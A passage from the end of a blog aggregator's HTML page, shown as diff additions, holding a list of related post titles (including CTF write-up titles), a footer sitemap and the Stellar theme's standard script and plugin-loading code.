src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/02/16/65cf5c075dc14.jpg"></div><span class="title">《山河旅探》(Murders on the Yangtze River) 通关简评</span></a><a class="item" href="/rss/450a7f11.html" title="从 pwnable.tw——3x17 学习 .Fini_array"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=9298"></div><span class="title">从 pwnable.tw——3x17 学习 .Fini_array</span></a><a class="item" href="/rss/a34ac8df.html" title="沙箱与Docker"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=781"></div><span class="title">沙箱与Docker</span></a><a class="item" href="/rss/afba8c2e.html" title="SJTU CTF 2024 暨 GEEKCTF 2024 WriteUp"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/04/26/662b492c58255.png"></div><span class="title">SJTU CTF 2024 暨 GEEKCTF 2024 WriteUp</span></a><a class="item" href="/rss/37c40255.html" title="终端自定义——StarShip"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/07/29/64c4ffaa041d6.png"></div><span class="title">终端自定义——StarShip</span></a><a class="item" href="/rss/46b69390.html" title="隐语开源Meetup一周年专场与会记录"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/07/22/64bbe1b38a067.jpg"></div><span class="title">隐语开源Meetup一周年专场与会记录</span></a><a class="item" href="/rss/59b16766.html" title="第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/05/20/664abdea520d8.jpeg"></div><span class="title">第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup</span></a></div></section></div>
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">RSS</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">Support</span><a target="_blank" rel="noopener" href="https://blog.mhuig.top/">博客</a><a target="_blank" rel="noopener" href="https://api.mhuig.top/">API</a><a target="_blank" rel="noopener" href="https://ssl.mhuig.top/">SSL Status</a><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mhuig.instatus.com/">Status Monitors</a></div><div class="sitemap-group"><span class="fs14">社交</span><a target="_blank" rel="noopener" href="https://blog.mhuig.top/pages/friends/">友链</a><a target="_blank" rel="noopener" href="https://blog.mhuig.top/pages/about/">留言板</a></div><div class="sitemap-group"><span class="fs14">更多</span><a target="_blank" rel="noopener" href="https://mhuig.top/">关于我</a><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/MHuiG">GitHub</a><a href="/contact/">Contact</a><a href="/privacy-policy/">隐私政策</a></div></div><div class="text"><p>本站由 <a target="_blank" rel="noopener" href="https://mhuig.top/">MHuiG</a> 使用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建，您可以在 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/MHG-LAB/RSSBOX">GitHub</a> 找到本站源码<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/blob/master/translations/LICENSE_zh-CN">GLWT（Good Luck With That，祝你好运）公共许可证</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class="float-panel mobile-only blur" style="display:none">
+  <button type="button" class="sidebar-toggle mobile" onclick="sidebar.toggle()">
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"/><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"/></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class="scripts">
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.9.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://static.mhuig.top/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://static.mhuig.top/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://static.mhuig.top/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://static.mhuig.top/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://static.mhuig.top/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://static.mhuig.top/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://static.mhuig.top/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img,article.content img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
